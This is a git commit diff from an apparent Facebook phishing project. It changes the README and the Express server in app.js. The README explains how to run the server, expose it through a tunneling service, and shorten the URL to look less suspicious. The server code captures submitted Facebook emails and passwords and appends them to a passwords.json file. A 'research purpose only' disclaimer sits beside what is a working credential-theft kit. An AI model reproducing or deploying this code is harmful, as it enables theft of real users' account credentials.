a754c0a2a117269f0b01d008cc818b1418b5cfb0
Rousan Ali <rousanali786@gmail.com>
2019-09-25 16:36:28 +0530

    Setup for mobile view

--- README.md
+++ README.md
@@ -1,2 +1,16 @@
-# fb-phising
-The phising page for Facebook. WE WON'T BE RESPONSIBLE FOR ANY MISUSE. IT'S FOR RESEARCH PURPOSE.
+# FB Phishing Page
+
+It's for research purpose only, we won't be responsible for any misuses.
+
+
+## Setup
+
+Start the server
+
+```sh
+npm start
+```
+
+After that, you can use any http tunneling service (e.g. `ngrock`) to get a public url; And you can also use any url shortener to make it more unsuspicious. 
+
+You will get captured credentials on `passwords.json` file which would be auto-generated.
--- app.js
+++ app.js
@@ -1,16 +1,39 @@
+const fs = require("fs-extra");
 const path = require("path");
 const express = require('express');
 const bodyParser = require('body-parser');
-const app = express();
-const port = 3000;
+const logger = require('./logger');
 
+const port = 3000;
+const passwordsFilePath = path.resolve("passwords.json");
+
+const app = express();
+
+app.use((req, res, next) => {
+  logger.info(`${req.method.toUpperCase()} ${req.originalUrl}`);
+  next();
+});
 app.use(bodyParser.urlencoded({ extended: false }));
 
-app.get('/', (req, res) => res.sendFile(path.resolve("indexs.html")));
+app.get('/', (req, res) => res.sendFile(path.resolve("index.html")));
 app.post('/login', (req, res) => {
-  const email = req.body.email;
-  const pass = req.body.pass;
-  console.log({ email, pass });
+  const { email, pass } = req.body;
+
+  let capturedPasswords;
+  if (fs.existsSync(passwordsFilePath)) {
+    capturedPasswords = fs.readJSONSync(passwordsFilePath);
+  } else {
+    capturedPasswords = [];
+  }
+
+  capturedPasswords.push({
+    email,
+    pass
+  });
+
+  fs.writeJSONSync(passwordsFilePath, capturedPasswords, { spaces: 2 });
 });
 
-app.listen(port, () => console.log(`App listening on port ${port}!`));
+app.use((req, res) => res.sendFile(path.resolve("index.html")));
+
+app.listen(port, () => logger.info(`App listening on port ${port}!`));
